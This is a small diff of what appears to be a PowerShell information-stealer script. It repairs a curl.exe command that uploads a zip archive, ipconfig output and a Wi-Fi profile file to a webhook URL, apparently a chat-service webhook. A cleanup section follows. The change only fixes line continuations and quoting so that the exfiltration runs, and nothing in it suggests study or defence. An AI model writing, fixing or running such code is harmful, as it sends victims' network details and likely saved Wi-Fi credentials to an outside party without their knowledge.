@@ -40,13 +40,11 @@ $payload = @{
 } | ConvertTo-Json -Compress
 
 curl.exe -X POST `
-  -H "Content-Type: multipart/form-data" `
   -F "payload_json=$payload" `
   -F "file1=@$zip" `
-  -F "file2=@$e\ipcfg.txt" `,
-  -F "file3=@$wifiFile" `,
-  $wh
-
+  -F "file2=@$e\ipcfg.txt" `
+  -F "file3=@$wifiFile" `
+  "$wh"   
 
 # cleanup
 #cls
